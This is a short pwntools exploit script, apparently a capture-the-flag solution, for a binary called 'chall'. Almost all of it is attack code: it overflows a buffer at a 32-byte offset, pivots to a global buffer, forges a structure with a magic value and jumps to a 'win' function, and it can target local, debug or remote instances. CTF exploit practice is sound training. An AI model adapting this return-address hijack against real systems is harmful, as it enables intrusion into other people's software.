#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('chall')
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *vuln+53
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    offset = 32
    global_buf = 0x404530

    payload = flat({
        offset: [
            global_buf + 0x20,
            exe.sym["vuln"]+8
        ]
    })

    state = 0xf1eeee2d
    fake = b"A" * 0xf + p64(state) + b"B" * 0x10 + p64(exe.sym["win"])

    io.sendafter(b"?", payload)
    io.sendlineafter(b"?", fake)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()